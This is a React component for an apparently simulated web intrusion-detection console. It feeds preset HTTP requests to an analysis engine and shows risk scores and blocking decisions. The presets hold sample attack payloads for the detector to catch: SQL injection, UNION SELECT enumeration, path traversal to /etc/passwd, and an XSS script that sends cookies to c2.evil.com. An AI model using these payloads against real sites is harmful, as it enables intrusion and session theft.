import React, { useState } from 'react';
import {
  Zap,
  ShieldAlert,
  ShieldCheck,
  AlertTriangle,
  Lock,
  ArrowRight,
  Database,
  Code,
  Terminal,
  Activity
} from 'lucide-react';
import { RequestAnalysisInput, SecurityEvent } from '../../types/security';

interface LiveMonitorViewProps {
  onAnalyze: (input: RequestAnalysisInput) => SecurityEvent;
  onOpenDetails: (event: SecurityEvent) => void;
}

export const LiveMonitorView: React.FC<LiveMonitorViewProps> = ({
  onAnalyze,
  onOpenDetails
}) => {
  const [ip, setIp] = useState('198.51.100.88');
  const [method, setMethod] = useState('POST');
  const [url, setUrl] = useState('/api/v1/auth/login');
  const [parameters, setParameters] = useState("username=admin' OR '1'='1&password=test");
  const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0');
  const [frequency, setFrequency] = useState(4);
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [resultEvent, setResultEvent] = useState<SecurityEvent | null>(null);

  // One-click presets
  const presets = [
    {
      name: "SQL Injection (' OR 1=1)",
      category: 'SQLi',
      color: 'border-rose-900/60 text-rose-300 bg-rose-950/30 hover:bg-rose-950/60',
      data: {
        ip: '198.51.100.42',
        method: 'POST',
        url: '/api/v1/auth/login',
        params: "username=admin' OR '1'='1&password=dummy",
        agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
        freq: 3
      }
    },
    {
      name: 'SQL UNION SELECT Leak',
      category: 'SQLi',
      color: 'border-rose-900/60 text-rose-300 bg-rose-950/30 hover:bg-rose-950/60',
      data: {
        ip: '198.51.100.42',
        method: 'GET',
        url: "/api/products?id=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns--",
        params: "id=1 UNION SELECT 1,table_name,column_name FROM information_schema.columns--",
        agent: 'sqlmap/1.7.2#stable',
        freq: 8
      }
    },
    {
      name: 'Cross-Site Scripting (XSS)',
      category: 'XSS',
      color: 'border-orange-900/60 text-orange-300 bg-orange-950/30 hover:bg-orange-950/60',
      data: {
        ip: '203.0.113.45',
        method: 'POST',
        url: '/api/comments/new',
        params: 'comment=<script>document.location="http://c2.evil.com/steal?c="+document.cookie</script>',
        agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        freq: 2
      }
    },
    {
      name: 'Brute Force Burst (48 req/m)',
      category: 'Burst',
      color: 'border-purple-900/60 text-purple-300 bg-purple-950/30 hover:bg-purple-950/60',
      data: {
        ip: '203.0.113.89',
        method: 'POST',
        url: '/api/v1/auth/login',
        params: 'username=root&password=password123',
        agent: 'Python-urllib/3.10',
        freq: 48
      }
    },
    {
      name: 'Path Traversal (/etc/passwd)',
      category: 'Tampering',
      color: 'border-amber-900/60 text-amber-300 bg-amber-950/30 hover:bg-amber-950/60',
      data: {
        ip: '192.0.2.77',
        method: 'GET',
        url: '/file/fetch?path=../../../../etc/passwd',
        params: 'path=../../../../etc/passwd',
        agent: 'curl/7.88.1',
        freq: 5
      }
    },
    {
      name: 'Benign Clean Request',
      category: 'Benign',
      color: 'border-emerald-900/60 text-emerald-300 bg-emerald-950/30 hover:bg-emerald-950/60',
      data: {
        ip: '192.168.1.105',
        method: 'GET',
        url: '/api/v1/catalog/items?category=laptops&limit=20',
        params: 'category=laptops&limit=20',
        agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Safari/537.36',
        freq: 4
      }
    }
  ];

  const handleApplyPreset = (preset: typeof presets[0]) => {
    setIp(preset.data.ip);
    setMethod(preset.data.method);
    setUrl(preset.data.url);
    setParameters(preset.data.params);
    setUserAgent(preset.data.agent);
    setFrequency(preset.data.freq);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsAnalyzing(true);

    setTimeout(() => {
      const event = onAnalyze({
        sourceIp: ip,
        method,
        url,
        parameters,
        userAgent,
        frequency: Number(frequency),
        body: method !== 'GET' ? parameters : undefined
      });
      setResultEvent(event);
      setIsAnalyzing(false);
    }, 450);
  };

  return (
    <div className="p-6 space-y-6 max-w-7xl mx-auto">
      {/* Kicker Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
        <div>
          <h2 className="text-lg font-bold text-white tracking-tight flex items-center gap-2">
            <Terminal className="w-5 h-5 text-cyan-400" />
            Live HTTP Request Inspection Console
          </h2>
          <p className="text-xs text-slate-400 font-mono mt-0.5">
            Real-time payload extraction, rule signature matching, anomaly analysis, and IPS quarantine trigger
          </p>
        </div>
        <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
          <span className="h-2 w-2 rounded-full bg-emerald-400 animate-ping" />
          <span>INSPECTION PIPELINE: OPERATIONAL</span>
        </div>
      </div>

      {/* Preset Buttons */}
      <div className="bg-slate-900/80 border border-slate-800/90 p-4 rounded-xl space-y-2">
        <div className="text-xs font-semibold text-slate-400 uppercase tracking-wider font-mono">
          One-Click Threat Injection Scenarios:
        </div>
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
          {presets.map((p, idx) => (
            <button
              key={idx}
              onClick={() => handleApplyPreset(p)}
              className={`p-2.5 rounded-lg border text-left transition font-mono text-xs flex flex-col justify-between ${p.color}`}
            >
              <span className="text-[10px] text-slate-400 font-semibold">{p.category}</span>
              <span className="font-bold truncate mt-1">{p.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Main Two-Column Console */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left: Request Parameters Form (7 cols) */}
        <div className="lg:col-span-6 bg-slate-900/80 border border-slate-800/90 p-6 rounded-xl space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <h3 className="text-sm font-semibold text-white flex items-center gap-2">
              <Code className="w-4 h-4 text-cyan-400" />
              Incoming HTTP Request Packet
            </h3>
            <span className="text-[11px] font-mono text-slate-500">RAW PARAMETERS</span>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4 text-xs font-mono">
            {/* IP and Method */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="sm:col-span-2">
                <label className="block text-slate-400 mb-1">Source IP Address</label>
                <input
                  type="text"
                  value={ip}
                  onChange={(e) => setIp(e.target.value)}
                  required
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                  placeholder="e.g. 198.51.100.42"
                />
              </div>
              <div>
                <label className="block text-slate-400 mb-1">HTTP Method</label>
                <select
                  value={method}
                  onChange={(e) => setMethod(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                >
                  <option value="GET">GET</option>
                  <option value="POST">POST</option>
                  <option value="PUT">PUT</option>
                  <option value="DELETE">DELETE</option>
                  <option value="PATCH">PATCH</option>
                </select>
              </div>
            </div>

            {/* Target URL */}
            <div>
              <label className="block text-slate-400 mb-1">Request URL / Target Endpoint</label>
              <input
                type="text"
                value={url}
                onChange={(e) => setUrl(e.target.value)}
                required
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                placeholder="/api/v1/auth/login"
              />
            </div>

            {/* Parameters / Body Payload */}
            <div>
              <label className="block text-slate-400 mb-1">
                Query String / Body Payload (Inspected for SQLi, XSS, Tampering)
              </label>
              <textarea
                rows={4}
                value={parameters}
                onChange={(e) => setParameters(e.target.value)}
                className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                placeholder="key=value&username=admin..."
              />
            </div>

            {/* User-Agent and Frequency */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="sm:col-span-2">
                <label className="block text-slate-400 mb-1">User-Agent Header</label>
                <input
                  type="text"
                  value={userAgent}
                  onChange={(e) => setUserAgent(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                  placeholder="Mozilla/5.0..."
                />
              </div>
              <div>
                <label className="block text-slate-400 mb-1">Velocity (req/min)</label>
                <input
                  type="number"
                  min={1}
                  max={200}
                  value={frequency}
                  onChange={(e) => setFrequency(Number(e.target.value))}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg p-2.5 text-white focus:border-cyan-500 outline-none"
                />
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isAnalyzing}
              className="w-full py-3 bg-cyan-600 hover:bg-cyan-500 font-bold text-white rounded-lg transition-all flex items-center justify-center gap-2 shadow-lg shadow-cyan-950/50 disabled:opacity-50"
            >
              {isAnalyzing ? (
                <>
                  <Activity className="w-4 h-4 animate-spin" />
                  <span>Inspecting Heuristics & Anomaly Entropy...</span>
                </>
              ) : (
                <>
                  <Zap className="w-4 h-4" />
                  <span>Analyze Request with ZeroAttack Engine</span>
                </>
              )}
            </button>
          </form>
        </div>

        {/* Right: Inspection Diagnosis & Mitigation (5 cols) */}
        <div className="lg:col-span-6 bg-slate-900/80 border border-slate-800/90 p-6 rounded-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-4">
              <h3 className="text-sm font-semibold text-white flex items-center gap-2">
                <Activity className="w-4 h-4 text-cyan-400" />
                Detection Diagnosis & Mitigation Output
              </h3>
              <span className="text-[11px] font-mono text-slate-500">ENGINE VERDICT</span>
            </div>

            {!resultEvent ? (
              <div className="p-12 text-center text-slate-500 font-mono text-xs space-y-3">
                <Terminal className="w-10 h-10 mx-auto text-slate-600" />
                <p>No request analyzed yet in this session.</p>
                <p className="text-slate-600">
                  Select a preset above or input HTTP parameters and click <strong>Analyze Request</strong>.
                </p>
              </div>
            ) : (
              <div className="space-y-4 font-mono text-xs">
                {/* Score & Verdict Banner */}
                <div className={`p-4 rounded-xl border flex items-center justify-between ${
                  resultEvent.severity === 'CRITICAL'
                    ? 'bg-rose-950/40 border-rose-800 text-rose-300'
                    : resultEvent.severity === 'HIGH'
                    ? 'bg-orange-950/40 border-orange-800 text-orange-300'
                    : resultEvent.severity === 'MEDIUM'
                    ? 'bg-amber-950/40 border-amber-800 text-amber-300'
                    : 'bg-emerald-950/40 border-emerald-800 text-emerald-300'
                }`}>
                  <div>
                    <span className="text-[10px] uppercase font-semibold text-slate-400">Risk Score</span>
                    <div className="text-3xl font-extrabold tabular-nums">
                      {resultEvent.riskScore} <span className="text-sm font-normal text-slate-400">/ 100</span>
                    </div>
                  </div>
                  <div className="text-center">
                    <span className="text-[10px] uppercase font-semibold text-slate-400">Severity</span>
                    <div className="text-base font-bold">{resultEvent.severity}</div>
                  </div>
                  <div className="text-right">
                    <span className="text-[10px] uppercase font-semibold text-slate-400">Action</span>
                    <div className="text-base font-bold underline underline-offset-2">{resultEvent.actionTaken}</div>
                  </div>
                </div>

                {/* Classification Breakdown */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg">
                    <span className="text-slate-500 text-[10px] block">ATTACK CLASSIFICATION</span>
                    <span className="text-white font-bold">{resultEvent.attackType}</span>
                  </div>
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg">
                    <span className="text-slate-500 text-[10px] block">DETECTION ENGINE</span>
                    <span className="text-cyan-400 font-bold">{resultEvent.detectionMethod}</span>
                  </div>
                </div>

                {/* Reason Details */}
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg space-y-1">
                  <span className="text-slate-500 text-[10px] block font-semibold">DETECTION EVIDENCE:</span>
                  <p className="text-slate-300">{resultEvent.detectionReason}</p>
                </div>

                {/* Matched Signatures */}
                {resultEvent.matchedIndicators.length > 0 && (
                  <div className="p-3 bg-slate-950 border border-rose-950/60 rounded-lg space-y-1.5">
                    <span className="text-rose-400 text-[10px] block font-semibold">
                      RULE SIGNATURE MATCHES ({resultEvent.matchedIndicators.length}):
                    </span>
                    {resultEvent.matchedIndicators.map((m, idx) => (
                      <div key={idx} className="flex justify-between items-center text-[11px] text-slate-300">
                        <span>{m.label}</span>
                        <span className="text-rose-400 font-bold">+{m.weight} pts</span>
                      </div>
                    ))}
                  </div>
                )}

                {/* Anomaly Contributions */}
                {resultEvent.anomalyFlags.length > 0 && (
                  <div className="p-3 bg-slate-950 border border-amber-950/60 rounded-lg space-y-1.5">
                    <span className="text-amber-400 text-[10px] block font-semibold">
                      STATISTICAL ANOMALY FLAGS ({resultEvent.anomalyFlags.length}):
                    </span>
                    {resultEvent.anomalyFlags.map((f, idx) => (
                      <div key={idx} className="text-[11px] text-slate-300">
                        <strong className="text-amber-300">{f.factor}:</strong> {f.detail}
                      </div>
                    ))}
                  </div>
                )}

                {/* Encrypted Record Cipher preview */}
                <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg space-y-1">
                  <div className="flex items-center justify-between text-slate-400 text-[10px]">
                    <span className="flex items-center gap-1 font-semibold text-cyan-400">
                      <Lock className="w-3 h-3" />
                      ENCRYPTED SECURITY RECORD (AES-256-GCM)
                    </span>
                    <span>128-bit MAC Tag</span>
                  </div>
                  <div className="text-[10px] font-mono text-cyan-300/80 break-all bg-slate-900/60 p-2 rounded">
                    {resultEvent.encryptedPayload}
                  </div>
                </div>

                {/* Automated Quarantine Alert */}
                {resultEvent.actionTaken === 'BLOCKED' && (
                  <div className="p-3 bg-rose-950/50 border border-rose-700 rounded-lg flex items-center gap-2 text-rose-300 text-[11px]">
                    <ShieldAlert className="w-4 h-4 text-rose-400 shrink-0" />
                    <span>
                      Automated IPS Triggered: Host IP <strong>{resultEvent.sourceIp}</strong> has been temporarily quarantined for 30 minutes in firewall table.
                    </span>
                  </div>
                )}
              </div>
            )}
          </div>

          {resultEvent && (
            <div className="pt-4 border-t border-slate-800 mt-4 flex justify-end">
              <button
                onClick={() => onOpenDetails(resultEvent)}
                className="flex items-center gap-2 px-4 py-2 bg-slate-800 hover:bg-slate-700 text-cyan-300 rounded-lg font-mono text-xs font-semibold transition"
              >
                <span>Inspect Forensic Details & Decrypt</span>
                <ArrowRight className="w-3.5 h-3.5" />
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
